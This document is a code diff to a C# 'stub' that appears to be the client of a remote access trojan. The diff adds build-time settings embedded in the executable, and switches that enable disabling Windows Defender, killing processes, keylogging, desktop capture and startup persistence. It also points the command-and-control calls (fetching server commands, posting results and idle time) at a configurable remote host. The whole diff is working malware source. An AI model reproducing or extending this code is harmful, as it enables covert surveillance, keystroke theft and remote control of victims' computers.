@@ -1,7 +1,10 @@
 ﻿using System;
 using System.ComponentModel;
+using System.IO;
 using System.Net;
 using System.Runtime.InteropServices;
+using System.Text;
+using System.Windows;
 
 namespace stub
 {
@@ -51,17 +54,54 @@ namespace stub
         
         static void Main(string[] args)
         {
-            
-            MutexHandler.createMutex();
+            string[] settingsArray = new string[8];
+
+            string ID = settingsArray[5];
+            MutexHandler.createMutex(ID);
             
             AppDomain.CurrentDomain.ProcessExit += new EventHandler(CurrentDomain_ProcessExit);
 
+            using (StreamReader sr = new StreamReader(System.Reflection.Assembly.GetEntryAssembly().Location))
+            {
+                using (BinaryReader br = new BinaryReader(sr.BaseStream))
+                {
+                    byte[] stubBytes = br.ReadBytes(Convert.ToInt32(sr.BaseStream.Length));
+                    string settings = Encoding.ASCII.GetString(stubBytes).Substring(Encoding.ASCII.GetString(stubBytes).IndexOf("BUILD")).Replace("BUILD", "");
+                    settingsArray = settings.Split('|');
+                    //MessageBox.Show(settings);
+                }
+            }
+            /*
+            foreach (string setting in settingsArray)
+            {
+                MessageBox.Show(setting);
+            }
+            */
             WebClientHandler.initwebClient();
-            //ClientAdder.runAtStartup();
-            ClientKeylogger.initClientKeylogger();
-            ClientDesktop.initClientDesktop();
-            //DisableDefender.initdisable();
-            //AntiProcess.StartAntiProcess();
+            
+            if (settingsArray[0] == "True")
+            {
+                AntiProcess.StartAntiProcess();
+            }
+            if (settingsArray[1] == "True")
+            {
+                DisableDefender.initdisable();
+            }
+            if (settingsArray[2] == "True")
+            {
+                ClientKeylogger.initClientKeylogger();
+            }
+            if (settingsArray[3] == "True")
+            {
+                ClientDesktop.initClientDesktop();
+            }
+            if (settingsArray[4] == "True")
+            {
+                ClientAdder.runAtStartup();
+            }
+            ConnectionIPHandler.IPSet(settingsArray[6]);
+            //MessageBox.Show(ID);
+            //MessageBox.Show(IP);
 
             WebClient webclient = WebClientHandler.wcReturn();
             
@@ -76,13 +116,13 @@ namespace stub
                 try
                 {
                     webclient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
-                    webclient.UploadString("http://127.0.0.1/idle.php", "client=" + name + "&idleTime=" + InputTimer.GetInputIdleTime().ToString());
+                    webclient.UploadString("http://" + ConnectionIPHandler.GetIP() + "/idle.php", "client=" + name + "&idleTime=" + InputTimer.GetInputIdleTime().ToString());
                 }
                 catch { }
                 try
                 {
                     webclient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
-                    cmdFromServer = webclient.UploadString("http://127.0.0.1/getServerCommands.php", "client=" + name);
+                    cmdFromServer = webclient.UploadString("http://" + ConnectionIPHandler.GetIP() + "/getServerCommands.php", "client=" + name);
                 }
                 catch { }
                 
@@ -143,7 +183,7 @@ namespace stub
                     try
                     {
                         webclient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
-                        webclient.UploadString("http://127.0.0.1/retString.php", "client=" + name + "&retstr=" + retString);
+                        webclient.UploadString("http://" + ConnectionIPHandler.GetIP() + "/retString.php", "client=" + name + "&retstr=" + retString);
                     }
                     catch { }
                 }
@@ -161,7 +201,7 @@ namespace stub
             try
             {
                 webclient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
-                webclient.UploadString("http://127.0.0.1/idle.php", "client=" + Dns.GetHostName() + "&idleTime=" + "Offline");
+                webclient.UploadString("http://" + ConnectionIPHandler.GetIP() + "/idle.php", "client=" + Dns.GetHostName() + "&idleTime=" + "Offline");
             }
             catch { }
         }
